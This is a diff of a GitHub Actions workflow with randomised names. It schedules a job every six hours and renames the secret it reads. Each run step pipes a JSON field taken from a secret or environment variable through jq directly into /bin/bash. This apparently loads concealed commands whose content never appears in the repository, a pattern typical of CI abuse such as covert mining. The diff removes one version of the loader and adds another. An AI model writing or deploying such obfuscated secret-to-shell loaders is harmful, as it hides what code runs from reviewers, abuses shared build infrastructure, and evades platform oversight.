@@ -2,8 +2,7 @@ name: lifupi9218
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 2/6 * * *'
-
+    - cron: '6 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: lifupi9218
         env:
-          ut44: ${{ secrets.ut44 }}
+          im24667: ${{ secrets.im24667 }}
         run: |
-          echo $ut44 | jq -r .zi687 | /bin/bash
-          echo $fr6647 | jq -r .jf55 | /bin/bash
-          echo $p8519 | jq -r .jpj69409 | /bin/bash
-          echo $sv01 | jq -r .o65 | /bin/bash
-          echo $p0979 | jq -r .tq7 | /bin/bash
+          echo $im24667 | jq -r .snvx87532 | /bin/bash
+          echo $vdla7562 | jq -r .gtxsn439 | /bin/bash
+          echo $fgzgw57 | jq -r .ymq1957 | /bin/bash
+          echo $z64 | jq -r .ta6676 | /bin/bash
 
